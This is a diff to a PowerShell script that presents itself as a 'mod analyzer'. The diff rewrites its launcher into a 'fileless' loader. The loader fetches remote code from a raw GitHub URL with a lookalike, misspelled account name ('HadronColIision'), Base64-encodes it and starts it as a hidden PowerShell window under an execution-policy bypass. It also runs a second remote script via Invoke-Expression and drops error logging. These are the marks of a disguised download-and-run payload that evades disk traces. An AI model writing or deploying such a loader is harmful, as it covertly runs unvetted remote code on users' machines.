@@ -805,59 +805,49 @@ if ($MacroMode) {
     [System.Windows.Forms.Application]::Run($appCtx)
 } else {
     # -----------------------------------------------------------------------
-    # Launcher block
-    # When run via Invoke-Expression the script has no file path, so we must
-    # save ourselves to disk first, then relaunch from that saved file.
+    # Launcher block — fully fileless, nothing ever touches disk
     # -----------------------------------------------------------------------
-
-    $safeLogDir = if ($env:TEMP -and (Test-Path $env:TEMP -ErrorAction SilentlyContinue)) { $env:TEMP } else { $env:USERPROFILE }
     $ErrorActionPreference = 'Stop'
 
     try {
-        # --- Resolve script path (works when run as a .ps1 file directly) ---
-        $scriptPath = $null
-        if ($PSCommandPath) { $scriptPath = $PSCommandPath }
-        if (-not $scriptPath -and $MyInvocation.MyCommand.Path) { $scriptPath = $MyInvocation.MyCommand.Path }
-
-        # --- If no path found, we were run via Invoke-Expression: save to disk ---
-        if (-not $scriptPath -or -not (Test-Path $scriptPath -ErrorAction SilentlyContinue)) {
-            $savePath = Join-Path $env:TEMP 'BrxtwurstMcrs.ps1'
-
-            # Download a fresh copy of ourselves and save it
-            $scriptContent = Invoke-RestMethod "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/BrxtwurstMcrs.ps1"
-            $scriptContent | Set-Content -Path $savePath -Encoding UTF8 -Force
-            $scriptPath = $savePath
-        }
-
-        $scriptDir = Split-Path -Parent $scriptPath
-
-        # Kill any stale background instances
+        # Kill any stale background instances of ourselves
         $myPid = $PID
         Get-Process | Where-Object {
             $_.Id -ne $myPid -and
-            $_.ProcessName -match "powershell|pwsh" -and
-            $_.MainWindowTitle -eq ""
+            $_.ProcessName -match "powershell|pwsh"
         } | ForEach-Object {
             try {
                 $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
-                if ($cmdLine -and $cmdLine -match "BrxtwurstMcrs") {
+                if ($cmdLine -and $cmdLine -match "WandaMacros_MacroMode") {
                     Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                 }
             } catch {}
         }
 
-        # Launch the hidden macro GUI background process
+        # Download our own source text from GitHub
+        $rawUrl  = "https://raw.githubusercontent.com/HadronColIision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1"
+        $srcText = Invoke-RestMethod $rawUrl
+
+        # Prepend a marker env var (used to identify/kill this child later)
+        # and force $MacroMode = $true so the child enters MacroMode immediately
+        $childCode = '$env:WandaMacros_MacroMode = "1"' + "`n" +
+                     '$MacroMode = [System.Management.Automation.SwitchParameter]::Present' + "`n" +
+                     $srcText
+
+        # Encode as UTF-16LE Base64 — the only encoding PowerShell -EncodedCommand accepts
+        $bytes   = [System.Text.Encoding]::Unicode.GetBytes($childCode)
+        $encoded = [Convert]::ToBase64String($bytes)
+
+        # Launch the hidden macro GUI process — zero files written to disk
         Start-Process -WindowStyle Hidden `
             -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
-            -ArgumentList "-ExecutionPolicy Bypass -STA -NoProfile -File `"$scriptPath`" -MacroMode"
+            -ArgumentList "-ExecutionPolicy Bypass -STA -NoProfile -EncodedCommand $encoded"
 
         # Run the visible mod analyzer in this foreground window
         Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
         Invoke-Expression (Invoke-RestMethod "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1")
 
     } catch {
-        $logPath = Join-Path $safeLogDir 'error.log'
-        $_ | Out-File $logPath -Force
         Write-Host "ERROR: $_" -ForegroundColor Red
         Read-Host "Press Enter to exit"
     }
